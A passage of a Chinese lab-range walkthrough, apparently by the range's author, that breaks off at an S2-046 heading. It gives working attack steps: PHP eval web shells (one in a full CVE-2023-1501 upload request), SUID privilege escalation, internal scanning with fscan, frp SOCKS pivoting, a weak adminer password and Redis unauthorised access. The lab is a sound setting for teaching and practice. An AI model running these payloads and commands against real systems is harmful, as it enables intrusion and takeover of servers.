+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#79B8FF">0</span><span style="color:#F97583">=</span><span style="color:#79B8FF">system</span><span style="color:#F97583">&#x26;</span><span style="color:#79B8FF">1</span><span style="color:#F97583">=</span><span style="color:#79B8FF">echo</span><span style="color:#9ECBFF"> '&#x3C;?php eval($_POST[1]);?>'</span><span style="color:#F97583"> ></span><span style="color:#79B8FF"> 123.php</span></span></code></pre>
+<p>写入新木马后，我们直接使用 <code>哥斯拉</code> 连接后进行提权操作。</p>
+<blockquote>
+<p>根目录我放了一个 <code>600</code> 权限的 <code>flag</code> 文件用来引导用户进行提权操作，但是不知道主办方是否允许存在 flag，所以文件没写入内容（整个靶机提权与否不影响往下进行）</p>
+</blockquote>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line" data-line="1"><span style="color:#B392F0">/var/www/html</span><span style="color:#F97583"> ></span><span style="color:#9ECBFF">whoami</span></span>
+<span class="line" data-line="2"><span style="color:#B392F0">www-data</span></span>
+<span class="line" data-line="3"></span>
+<span class="line" data-line="4"><span style="color:#B392F0">/var/www/html</span><span style="color:#F97583"> ></span><span style="color:#9ECBFF">find</span><span style="color:#9ECBFF"> /</span><span style="color:#79B8FF"> -perm</span><span style="color:#79B8FF"> -u=s</span><span style="color:#F97583"> 2></span><span style="color:#9ECBFF">/dev/null</span></span>
+<span class="line" data-line="5"><span style="color:#B392F0">/bin/su</span></span>
+<span class="line" data-line="6"><span style="color:#B392F0">/usr/bin/find</span></span>
+<span class="line" data-line="7"><span style="color:#B392F0">/usr/bin/passwd</span></span>
+<span class="line" data-line="8"><span style="color:#B392F0">/usr/bin/chage</span></span>
+<span class="line" data-line="9"><span style="color:#B392F0">/usr/bin/chfn</span></span>
+<span class="line" data-line="10"><span style="color:#B392F0">/usr/bin/chsh</span></span>
+<span class="line" data-line="11"><span style="color:#B392F0">/usr/bin/expiry</span></span>
+<span class="line" data-line="12"><span style="color:#B392F0">/usr/bin/gpasswd</span></span>
+<span class="line" data-line="13"><span style="color:#B392F0">/usr/bin/newgrp</span></span>
+<span class="line" data-line="14"><span style="color:#B392F0">/usr/bin/sudo</span></span>
+<span class="line" data-line="15"><span style="color:#B392F0">/usr/lib/mariadb/plugin/auth_pam_tool_dir/auth_pam_tool</span></span>
+<span class="line" data-line="16"></span>
+<span class="line" data-line="17"><span style="color:#B392F0">/var/www/html</span><span style="color:#F97583"> ></span><span style="color:#9ECBFF">find</span><span style="color:#9ECBFF"> /tmp</span><span style="color:#79B8FF"> -exec</span><span style="color:#9ECBFF"> whoami</span><span style="color:#79B8FF"> \;</span></span>
+<span class="line" data-line="18"><span style="color:#B392F0">root</span></span></code></pre>
+<p>剩下的就是查看网卡，可以发现存在 <code>192.168.100.0/24</code> 网卡，我们直接上传 <code>fscan</code> 进行信息收集</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line" data-line="1"><span style="color:#B392F0">/var/www/html</span><span style="color:#F97583"> ></span><span style="color:#9ECBFF">ifconfig</span></span>
+<span class="line" data-line="2"><span style="color:#B392F0">eth0</span><span style="color:#9ECBFF">      Link</span><span style="color:#9ECBFF"> encap:Ethernet</span><span style="color:#9ECBFF">  HWaddr</span><span style="color:#9ECBFF"> 02:42:C0:A8:64:02</span><span style="color:#E1E4E8">  </span></span>
+<span class="line" data-line="3"><span style="color:#B392F0">          inet</span><span style="color:#9ECBFF"> addr:192.168.100.2</span><span style="color:#9ECBFF">  Bcast:192.168.100.255</span><span style="color:#9ECBFF">  Mask:255.255.255.0</span></span>
+<span class="line" data-line="4"><span style="color:#B392F0">          UP</span><span style="color:#9ECBFF"> BROADCAST</span><span style="color:#9ECBFF"> RUNNING</span><span style="color:#9ECBFF"> MULTICAST</span><span style="color:#9ECBFF">  MTU:1500</span><span style="color:#9ECBFF">  Metric:1</span></span>
+<span class="line" data-line="5"><span style="color:#B392F0">          RX</span><span style="color:#9ECBFF"> packets:18293</span><span style="color:#9ECBFF"> errors:0</span><span style="color:#9ECBFF"> dropped:0</span><span style="color:#9ECBFF"> overruns:0</span><span style="color:#9ECBFF"> frame:0</span></span>
+<span class="line" data-line="6"><span style="color:#B392F0">          TX</span><span style="color:#9ECBFF"> packets:14157</span><span style="color:#9ECBFF"> errors:0</span><span style="color:#9ECBFF"> dropped:0</span><span style="color:#9ECBFF"> overruns:0</span><span style="color:#9ECBFF"> carrier:0</span></span>
+<span class="line" data-line="7"><span style="color:#B392F0">          collisions:0</span><span style="color:#9ECBFF"> txqueuelen:0</span><span style="color:#E1E4E8"> </span></span>
+<span class="line" data-line="8"><span style="color:#B392F0">          RX</span><span style="color:#9ECBFF"> bytes:26051495</span><span style="color:#E1E4E8"> (24.8 </span><span style="color:#9ECBFF">MiB</span><span style="color:#E1E4E8">)  TX bytes:3652659 (</span><span style="color:#B392F0">3.4</span><span style="color:#9ECBFF"> MiB</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="9"></span>
+<span class="line" data-line="10"><span style="color:#B392F0">lo</span><span style="color:#9ECBFF">        Link</span><span style="color:#9ECBFF"> encap:Local</span><span style="color:#9ECBFF"> Loopback</span><span style="color:#E1E4E8">  </span></span>
+<span class="line" data-line="11"><span style="color:#B392F0">          inet</span><span style="color:#9ECBFF"> addr:127.0.0.1</span><span style="color:#9ECBFF">  Mask:255.0.0.0</span></span>
+<span class="line" data-line="12"><span style="color:#B392F0">          UP</span><span style="color:#9ECBFF"> LOOPBACK</span><span style="color:#9ECBFF"> RUNNING</span><span style="color:#9ECBFF">  MTU:65536</span><span style="color:#9ECBFF">  Metric:1</span></span>
+<span class="line" data-line="13"><span style="color:#B392F0">          RX</span><span style="color:#9ECBFF"> packets:11703</span><span style="color:#9ECBFF"> errors:0</span><span style="color:#9ECBFF"> dropped:0</span><span style="color:#9ECBFF"> overruns:0</span><span style="color:#9ECBFF"> frame:0</span></span>
+<span class="line" data-line="14"><span style="color:#B392F0">          TX</span><span style="color:#9ECBFF"> packets:11703</span><span style="color:#9ECBFF"> errors:0</span><span style="color:#9ECBFF"> dropped:0</span><span style="color:#9ECBFF"> overruns:0</span><span style="color:#9ECBFF"> carrier:0</span></span>
+<span class="line" data-line="15"><span style="color:#B392F0">          collisions:0</span><span style="color:#9ECBFF"> txqueuelen:1000</span><span style="color:#E1E4E8"> </span></span>
+<span class="line" data-line="16"><span style="color:#B392F0">          RX</span><span style="color:#9ECBFF"> bytes:18055136</span><span style="color:#E1E4E8"> (17.2 </span><span style="color:#9ECBFF">MiB</span><span style="color:#E1E4E8">)  TX bytes:18055136 (</span><span style="color:#B392F0">17.2</span><span style="color:#9ECBFF"> MiB</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="17"></span>
+<span class="line" data-line="18"><span style="color:#B392F0">/var/www/html</span><span style="color:#F97583"> ></span><span style="color:#9ECBFF">cd</span><span style="color:#9ECBFF"> /tmp</span></span>
+<span class="line" data-line="19"></span>
+<span class="line" data-line="20"><span style="color:#B392F0">/tmp</span><span style="color:#F97583"> ></span><span style="color:#9ECBFF">chmod</span><span style="color:#9ECBFF"> +x</span><span style="color:#9ECBFF"> fscan</span></span>
+<span class="line" data-line="21"></span>
+<span class="line" data-line="22"><span style="color:#B392F0">/tmp</span><span style="color:#F97583"> ></span><span style="color:#9ECBFF">./fscan</span><span style="color:#79B8FF"> -h</span><span style="color:#9ECBFF"> 192.168.100.0/24</span><span style="color:#79B8FF"> -hn</span><span style="color:#79B8FF"> 192.168.100.2</span></span>
+<span class="line" data-line="23"><span style="color:#B392F0">start</span><span style="color:#9ECBFF"> infoscan</span></span>
+<span class="line" data-line="24"><span style="color:#B392F0">192.168.100.3:9000</span><span style="color:#9ECBFF"> open</span></span>
+<span class="line" data-line="25"><span style="color:#B392F0">192.168.100.3:80</span><span style="color:#9ECBFF"> open</span></span>
+<span class="line" data-line="26"><span style="color:#E1E4E8">[</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">] alive ports len is: 2</span></span>
+<span class="line" data-line="27"><span style="color:#B392F0">start</span><span style="color:#9ECBFF"> vulscan</span></span>
+<span class="line" data-line="28"><span style="color:#E1E4E8">[+] FCGI 192.168.100.3:9000 </span></span>
+<span class="line" data-line="29"><span style="color:#B392F0">Status:</span><span style="color:#79B8FF"> 403</span><span style="color:#9ECBFF"> Forbidden</span></span>
+<span class="line" data-line="30"><span style="color:#B392F0">X-Powered-By:</span><span style="color:#9ECBFF"> PHP/7.3.33</span></span>
+<span class="line" data-line="31"><span style="color:#B392F0">Content-type:</span><span style="color:#9ECBFF"> text/html</span><span style="color:#E1E4E8">; charset</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">UTF-8</span></span>
+<span class="line" data-line="32"></span>
+<span class="line" data-line="33"><span style="color:#B392F0">Access</span><span style="color:#9ECBFF"> denied.</span></span>
+<span class="line" data-line="34"><span style="color:#B392F0">stderr:Access</span><span style="color:#9ECBFF"> to</span><span style="color:#9ECBFF"> the</span><span style="color:#9ECBFF"> script</span><span style="color:#9ECBFF"> '/etc/issue'</span><span style="color:#9ECBFF"> has</span><span style="color:#9ECBFF"> been</span><span style="color:#9ECBFF"> denied</span><span style="color:#E1E4E8"> (see </span><span style="color:#9ECBFF">security.limit_extensions</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="35"><span style="color:#B392F0">plesa</span><span style="color:#9ECBFF"> try</span><span style="color:#9ECBFF"> other</span><span style="color:#9ECBFF"> path,as</span><span style="color:#79B8FF"> -path</span><span style="color:#9ECBFF"> /www/wwwroot/index.php</span></span>
+<span class="line" data-line="36"><span style="color:#E1E4E8">[</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">] WebTitle http://192.168.100.3      code:200 len:42     title:None</span></span>
+<span class="line" data-line="37"><span style="color:#E1E4E8">[+] PocScan http://192.168.100.3 poc-yaml-php-cgi-cve-2012-1823 </span></span></code></pre>
+<h3 id="信呼协同办公系统">信呼协同办公系统</h3>
+<p>可以看到下一层存在一个 Web 服务，我们直接搭建代理</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="ini"><code><span class="line" data-line="1"><span style="color:#6A737D"># 你自己机器 frps.ini</span></span>
+<span class="line" data-line="2"><span style="color:#B392F0">[common]</span></span>
+<span class="line" data-line="3"><span style="color:#F97583">server_port</span><span style="color:#E1E4E8"> = 7000</span></span>
+<span class="line" data-line="4"></span>
+<span class="line" data-line="5"><span style="color:#6A737D"># 织梦 frpc.ini</span></span>
+<span class="line" data-line="6"><span style="color:#B392F0">[common]</span></span>
+<span class="line" data-line="7"><span style="color:#F97583">server_addr</span><span style="color:#E1E4E8"> = 20.1.0.16 </span><span style="color:#6A737D"># 这里填aTrust分配的IP</span></span>
+<span class="line" data-line="8"><span style="color:#F97583">server_port</span><span style="color:#E1E4E8"> = 7000</span></span>
+<span class="line" data-line="9"></span>
+<span class="line" data-line="10"><span style="color:#B392F0">[plugin_socks6]</span></span>
+<span class="line" data-line="11"><span style="color:#F97583">type</span><span style="color:#E1E4E8"> = tcp</span></span>
+<span class="line" data-line="12"><span style="color:#F97583">remote_port</span><span style="color:#E1E4E8"> = 7001</span></span>
+<span class="line" data-line="13"><span style="color:#F97583">plugin</span><span style="color:#E1E4E8"> = socks5</span></span></code></pre>
+<p>然后通过 <code>Proxifier</code> 代理出来即可正常访问到信呼协同办公系统</p>
+<p><img src="https://img.5ime.cn/sangfor_cloud_confrontation/image-20240803221236454.png" alt="image-20240803221236454"></p>
+<p>经过测试应该可以发现这里存在一个小小的用户名枚举漏洞，通过该漏洞我们可以确定 <code>admin</code> 用户存在，但是密码爆破未果。</p>
+<p>通过目录扫描可以发现存在 <code>adminer</code>，通过弱口令 <code>root:root</code> 成功登录控制面板</p>
+<p><img src="https://img.5ime.cn/sangfor_cloud_confrontation/image-20240803221718230.png" alt="image-20240803221718230"></p>
+<p><img src="https://img.5ime.cn/sangfor_cloud_confrontation/image-20240803221757420.png" alt="image-20240803221757420"></p>
+<p>通过修改 <code>rockxinhu</code> 数据库中 <code>xinhu_admin</code> 表 <code>admin</code> 用户的 <code>pass</code> 字段来实现篡改密码（应该一眼能看出来是 md5）</p>
+<p><img src="https://img.5ime.cn/sangfor_cloud_confrontation/image-20240803221915446.png" alt="image-20240803221915446"></p>
+<p><img src="https://img.5ime.cn/sangfor_cloud_confrontation/image-20240803222638792.png" alt="image-20240803222638792"></p>
+<p>登陆过后，照着 <a href="https://gitee.com/xieqiangweb/cve/blob/master/cve/Rockoa.md">CVE-2023-1501</a> 漏洞进行复现即可实现 getshell</p>
+<p><img src="https://img.5ime.cn/sangfor_cloud_confrontation/image-20240803222738409.png" alt="image-20240803222738409"></p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="http"><code><span class="line" data-line="1"><span style="color:#F97583">POST</span><span style="color:#E1E4E8"> /index.php?a=upfile&#x26;m=upload&#x26;d=public&#x26;maxsize=2&#x26;ajaxbool=true&#x26;rnd=395715 </span><span style="color:#F97583">HTTP</span><span style="color:#E1E4E8">/</span><span style="color:#79B8FF">1.1</span></span>
+<span class="line" data-line="2"><span style="color:#85E89D">Host</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> 192.168.100.3</span></span>
+<span class="line" data-line="3"><span style="color:#85E89D">Content-Length</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> 225</span></span>
+<span class="line" data-line="4"><span style="color:#85E89D">User-Agent</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36</span></span>
+<span class="line" data-line="5"><span style="color:#85E89D">Content-Type</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> multipart/form-data; boundary=----WebKitFormBoundaryTUHp3yo6lIJsYU3o</span></span>
+<span class="line" data-line="6"><span style="color:#85E89D">Accept</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> */*</span></span>
+<span class="line" data-line="7"><span style="color:#85E89D">Origin</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> http://192.168.100.3</span></span>
+<span class="line" data-line="8"><span style="color:#85E89D">Referer</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> http://192.168.100.3/index.php?m=upload&#x26;d=public&#x26;callback=&#x26;upkey=20240803222857263101&#x26;showid=fileidview</span></span>
+<span class="line" data-line="9"><span style="color:#85E89D">Accept-Encoding</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> gzip, deflate</span></span>
+<span class="line" data-line="10"><span style="color:#85E89D">Accept-Language</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> zh-CN,zh;q=0.9</span></span>
+<span class="line" data-line="11"><span style="color:#85E89D">Cookie</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> PHPSESSID=349e6ea884663131a41d928c0e5d1ae7; deviceid=1722695306459; xinhu_mo_adminid=zz0ltt0vt0kh0zz0vv0wk0ltt0zv0vz0llc0kv04; xinhu_ca_adminuser=admin; xinhu_ca_rempass=0</span></span>
+<span class="line" data-line="12"><span style="color:#85E89D">Connection</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> close</span></span>
+<span class="line" data-line="13"></span>
+<span class="line" data-line="14"><span style="color:#E1E4E8">------WebKitFormBoundaryTUHp3yo6lIJsYU3o</span></span>
+<span class="line" data-line="15"><span style="color:#85E89D">Content-Disposition</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> form-data; name="file"; filename="shell.php"</span></span>
+<span class="line" data-line="16"><span style="color:#85E89D">Content-Type</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> application/octet-stream</span></span>
+<span class="line" data-line="17"></span>
+<span class="line" data-line="18"><span style="color:#E1E4E8">&#x3C;?</span><span style="color:#85E89D">php</span><span style="color:#E1E4E8"> @eval(@$_POST[cmd]);?></span></span>
+<span class="line" data-line="19"><span style="color:#E1E4E8">------WebKitFormBoundaryTUHp3yo6lIJsYU3o--</span></span></code></pre>
+<p><img src="https://img.5ime.cn/sangfor_cloud_confrontation/image-20240803222956897.png" alt="image-20240803222956897"></p>
+<p>抓包上传后可以得到文件的 <code>上传路径</code> 以及 <code>文件id</code></p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>path: upload/2024-08/03_22291046.uptemp</span></span>
+<span class="line" data-line="2"><span>id: 8</span></span></code></pre>
+<p>我们在通过另一个接口来将 <code>uptemp</code> 后缀更换为 <code>php</code>，后面直接用源路径（需更改后缀）连接一句话木马即可</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="http"><code><span class="line" data-line="1"><span style="color:#F97583">GET</span><span style="color:#E1E4E8"> /task.php?m=qcloudCos|runt&#x26;a=run&#x26;fileid=8 </span><span style="color:#F97583">HTTP</span><span style="color:#E1E4E8">/</span><span style="color:#79B8FF">1.1</span></span>
+<span class="line" data-line="2"><span style="color:#85E89D">Host</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> 192.168.100.3</span></span>
+<span class="line" data-line="3"><span style="color:#85E89D">User-Agent</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36</span></span>
+<span class="line" data-line="4"><span style="color:#85E89D">Accept</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> */*</span></span>
+<span class="line" data-line="5"><span style="color:#85E89D">Origin</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> http://192.168.100.3</span></span>
+<span class="line" data-line="6"><span style="color:#85E89D">Referer</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> http://192.168.100.3/index.php?m=upload&#x26;d=public&#x26;callback=&#x26;upkey=20240803222857263101&#x26;showid=fileidview</span></span>
+<span class="line" data-line="7"><span style="color:#85E89D">Accept-Encoding</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> gzip, deflate</span></span>
+<span class="line" data-line="8"><span style="color:#85E89D">Accept-Language</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> zh-CN,zh;q=0.9</span></span>
+<span class="line" data-line="9"><span style="color:#85E89D">Cookie</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> PHPSESSID=349e6ea884663131a41d928c0e5d1ae7; deviceid=1722695306459; xinhu_mo_adminid=zz0ltt0vt0kh0zz0vv0wk0ltt0zv0vz0llc0kv04; xinhu_ca_adminuser=admin; xinhu_ca_rempass=0</span></span>
+<span class="line" data-line="10"><span style="color:#85E89D">Connection</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> close</span></span></code></pre>
+<p><img src="https://img.5ime.cn/sangfor_cloud_confrontation/image-20240803223332415.png" alt="image-20240803223332415"></p>
+<p>这里也是同样留了一个 <code>/flag</code> 来引导用户进行提权</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line" data-line="1"><span style="color:#B392F0">/app/upload/2024-08/</span><span style="color:#F97583"> ></span><span style="color:#9ECBFF">find</span><span style="color:#9ECBFF"> /</span><span style="color:#79B8FF"> -perm</span><span style="color:#79B8FF"> -u=s</span><span style="color:#F97583"> 2></span><span style="color:#9ECBFF">/dev/null</span></span>
+<span class="line" data-line="2"><span style="color:#B392F0">/bin/mount</span></span>
+<span class="line" data-line="3"><span style="color:#B392F0">/bin/su</span></span>
+<span class="line" data-line="4"><span style="color:#B392F0">/bin/umount</span></span>
+<span class="line" data-line="5"><span style="color:#B392F0">/tmp/.backdoor</span></span>
+<span class="line" data-line="6"><span style="color:#B392F0">/usr/bin/chfn</span></span>
+<span class="line" data-line="7"><span style="color:#B392F0">/usr/bin/chsh</span></span>
+<span class="line" data-line="8"><span style="color:#B392F0">/usr/bin/gpasswd</span></span>
+<span class="line" data-line="9"><span style="color:#B392F0">/usr/bin/newgrp</span></span>
+<span class="line" data-line="10"><span style="color:#B392F0">/usr/bin/passwd</span></span>
+<span class="line" data-line="11"></span>
+<span class="line" data-line="12"><span style="color:#B392F0">/tmp</span><span style="color:#F97583"> ></span><span style="color:#9ECBFF">cd</span><span style="color:#9ECBFF"> /tmp</span></span>
+<span class="line" data-line="13"><span style="color:#B392F0">/tmp</span><span style="color:#F97583"> ></span><span style="color:#9ECBFF">./.backdoor</span></span>
+<span class="line" data-line="14"><span style="color:#B392F0">Usage:</span><span style="color:#9ECBFF"> ./.backdoor</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">comman</span><span style="color:#E1E4E8">d</span><span style="color:#F97583">></span></span>
+<span class="line" data-line="15"></span>
+<span class="line" data-line="16"><span style="color:#B392F0">/tmp</span><span style="color:#F97583"> ></span><span style="color:#9ECBFF">./.backdoor</span><span style="color:#9ECBFF"> 'whoami'</span></span>
+<span class="line" data-line="17"><span style="color:#B392F0">root</span></span></code></pre>
+<p>下面就是老样子，看看有没有多个网卡然后进行信息收集</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line" data-line="1"><span style="color:#B392F0">/app/upload/2024-08/</span><span style="color:#F97583"> ></span><span style="color:#9ECBFF">ip</span><span style="color:#9ECBFF"> a</span></span>
+<span class="line" data-line="2"><span style="color:#B392F0">1:</span><span style="color:#9ECBFF"> lo:</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">LOOPBACK,UP,LOWER_U</span><span style="color:#E1E4E8">P</span><span style="color:#F97583">></span><span style="color:#9ECBFF"> mtu</span><span style="color:#79B8FF"> 65536</span><span style="color:#9ECBFF"> qdisc</span><span style="color:#9ECBFF"> noqueue</span><span style="color:#9ECBFF"> state</span><span style="color:#9ECBFF"> UNKNOWN</span><span style="color:#9ECBFF"> group</span><span style="color:#9ECBFF"> default</span><span style="color:#9ECBFF"> qlen</span><span style="color:#79B8FF"> 1000</span></span>
+<span class="line" data-line="3"><span style="color:#B392F0">    link/loopback</span><span style="color:#9ECBFF"> 00:00:00:00:00:00</span><span style="color:#9ECBFF"> brd</span><span style="color:#9ECBFF"> 00:00:00:00:00:00</span></span>
+<span class="line" data-line="4"><span style="color:#B392F0">    inet</span><span style="color:#9ECBFF"> 127.0.0.1/8</span><span style="color:#9ECBFF"> scope</span><span style="color:#9ECBFF"> host</span><span style="color:#9ECBFF"> lo</span></span>
+<span class="line" data-line="5"><span style="color:#B392F0">       valid_lft</span><span style="color:#9ECBFF"> forever</span><span style="color:#9ECBFF"> preferred_lft</span><span style="color:#9ECBFF"> forever</span></span>
+<span class="line" data-line="6"><span style="color:#B392F0">629:</span><span style="color:#9ECBFF"> eth0@if630:</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">BROADCAST,MULTICAST,UP,LOWER_U</span><span style="color:#E1E4E8">P</span><span style="color:#F97583">></span><span style="color:#9ECBFF"> mtu</span><span style="color:#79B8FF"> 1500</span><span style="color:#9ECBFF"> qdisc</span><span style="color:#9ECBFF"> noqueue</span><span style="color:#9ECBFF"> state</span><span style="color:#9ECBFF"> UP</span><span style="color:#9ECBFF"> group</span><span style="color:#9ECBFF"> default</span><span style="color:#E1E4E8"> </span></span>
+<span class="line" data-line="7"><span style="color:#B392F0">    link/ether</span><span style="color:#9ECBFF"> 02:42:c0:a8:64:03</span><span style="color:#9ECBFF"> brd</span><span style="color:#9ECBFF"> ff:ff:ff:ff:ff:ff</span><span style="color:#9ECBFF"> link-netnsid</span><span style="color:#79B8FF"> 0</span></span>
+<span class="line" data-line="8"><span style="color:#B392F0">    inet</span><span style="color:#9ECBFF"> 192.168.100.3/24</span><span style="color:#9ECBFF"> brd</span><span style="color:#79B8FF"> 192.168.100.255</span><span style="color:#9ECBFF"> scope</span><span style="color:#9ECBFF"> global</span><span style="color:#9ECBFF"> eth0</span></span>
+<span class="line" data-line="9"><span style="color:#B392F0">       valid_lft</span><span style="color:#9ECBFF"> forever</span><span style="color:#9ECBFF"> preferred_lft</span><span style="color:#9ECBFF"> forever</span></span>
+<span class="line" data-line="10"><span style="color:#B392F0">631:</span><span style="color:#9ECBFF"> eth1@if632:</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">BROADCAST,MULTICAST,UP,LOWER_U</span><span style="color:#E1E4E8">P</span><span style="color:#F97583">></span><span style="color:#9ECBFF"> mtu</span><span style="color:#79B8FF"> 1500</span><span style="color:#9ECBFF"> qdisc</span><span style="color:#9ECBFF"> noqueue</span><span style="color:#9ECBFF"> state</span><span style="color:#9ECBFF"> UP</span><span style="color:#9ECBFF"> group</span><span style="color:#9ECBFF"> default</span><span style="color:#E1E4E8"> </span></span>
+<span class="line" data-line="11"><span style="color:#B392F0">    link/ether</span><span style="color:#9ECBFF"> 02:42:0a:0a:0a:02</span><span style="color:#9ECBFF"> brd</span><span style="color:#9ECBFF"> ff:ff:ff:ff:ff:ff</span><span style="color:#9ECBFF"> link-netnsid</span><span style="color:#79B8FF"> 0</span></span>
+<span class="line" data-line="12"><span style="color:#B392F0">    inet</span><span style="color:#9ECBFF"> 10.10.10.2/24</span><span style="color:#9ECBFF"> brd</span><span style="color:#79B8FF"> 10.10.10.255</span><span style="color:#9ECBFF"> scope</span><span style="color:#9ECBFF"> global</span><span style="color:#9ECBFF"> eth1</span></span>
+<span class="line" data-line="13"><span style="color:#B392F0">       valid_lft</span><span style="color:#9ECBFF"> forever</span><span style="color:#9ECBFF"> preferred_lft</span><span style="color:#9ECBFF"> forever</span></span>
+<span class="line" data-line="14"><span style="color:#E1E4E8">       </span></span>
+<span class="line" data-line="15"><span style="color:#B392F0">/app/upload/2024-08/</span><span style="color:#F97583"> ></span><span style="color:#9ECBFF">cd</span><span style="color:#9ECBFF"> /tmp</span></span>
+<span class="line" data-line="16"></span>
+<span class="line" data-line="17"><span style="color:#B392F0">/tmp</span><span style="color:#F97583"> ></span><span style="color:#9ECBFF">chmod</span><span style="color:#9ECBFF"> +x</span><span style="color:#9ECBFF"> fscan</span></span>
+<span class="line" data-line="18"></span>
+<span class="line" data-line="19"><span style="color:#B392F0">/tmp</span><span style="color:#F97583"> ></span><span style="color:#9ECBFF">./fscan</span><span style="color:#79B8FF"> -h</span><span style="color:#9ECBFF"> 10.10.10.0/24</span><span style="color:#79B8FF"> -hn</span><span style="color:#79B8FF"> 10.10.10.2</span></span>
+<span class="line" data-line="20"><span style="color:#B392F0">start</span><span style="color:#9ECBFF"> infoscan</span></span>
+<span class="line" data-line="21"><span style="color:#B392F0">10.10.10.3:6379</span><span style="color:#9ECBFF"> open</span></span>
+<span class="line" data-line="22"><span style="color:#B392F0">10.10.10.4:8009</span><span style="color:#9ECBFF"> open</span></span>
+<span class="line" data-line="23"><span style="color:#B392F0">10.10.10.4:8080</span><span style="color:#9ECBFF"> open</span></span>
+<span class="line" data-line="24"><span style="color:#E1E4E8">[</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">] alive ports len is: 3</span></span>
+<span class="line" data-line="25"><span style="color:#B392F0">start</span><span style="color:#9ECBFF"> vulscan</span></span>
+<span class="line" data-line="26"><span style="color:#E1E4E8">[+] Redis 10.10.10.3:6379 unauthorized file:/data/dump.rdb</span></span>
+<span class="line" data-line="27"><span style="color:#E1E4E8">[</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">] WebTitle http://10.10.10.4:8080    code:200 len:90     title:$Title$</span></span>
+<span class="line" data-line="28"><span style="color:#E1E4E8">[+] PocScan http://10.10.10.4:8080 poc-yaml-struts2_045 poc</span></span></code></pre>
+<h3 id="redis-未授权访问">Redis 未授权访问</h3>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="ini"><code><span class="line" data-line="1"><span style="color:#6A737D"># 织梦 frps.ini</span></span>
+<span class="line" data-line="2"><span style="color:#B392F0">[common]</span></span>
+<span class="line" data-line="3"><span style="color:#F97583">server_port</span><span style="color:#E1E4E8"> = 7000</span></span>
+<span class="line" data-line="4"></span>
+<span class="line" data-line="5"><span style="color:#6A737D"># 信呼 frpc.ini</span></span>
+<span class="line" data-line="6"><span style="color:#B392F0">[common]</span></span>
+<span class="line" data-line="7"><span style="color:#F97583">server_addr</span><span style="color:#E1E4E8"> = 192.168.100.2</span></span>
+<span class="line" data-line="8"><span style="color:#F97583">server_port</span><span style="color:#E1E4E8"> = 7000</span></span>
+<span class="line" data-line="9"></span>
+<span class="line" data-line="10"><span style="color:#B392F0">[plugin_socks6]</span></span>
+<span class="line" data-line="11"><span style="color:#F97583">type</span><span style="color:#E1E4E8"> = tcp</span></span>
+<span class="line" data-line="12"><span style="color:#F97583">remote_port</span><span style="color:#E1E4E8"> = 7001</span></span>
+<span class="line" data-line="13"><span style="color:#F97583">plugin</span><span style="color:#E1E4E8"> = socks5</span></span></code></pre>
+<p>这里可以看到直接可以进行未授权访问（也可以通过 <code>主从复制</code> 实现 <code>RCE</code>）</p>
+<p><img src="https://img.5ime.cn/sangfor_cloud_confrontation/image-20240803225657470.png" alt="image-20240803225657470"></p>
+<h3 id="s2-046-命令执行">S2-046 命令执行</h3>
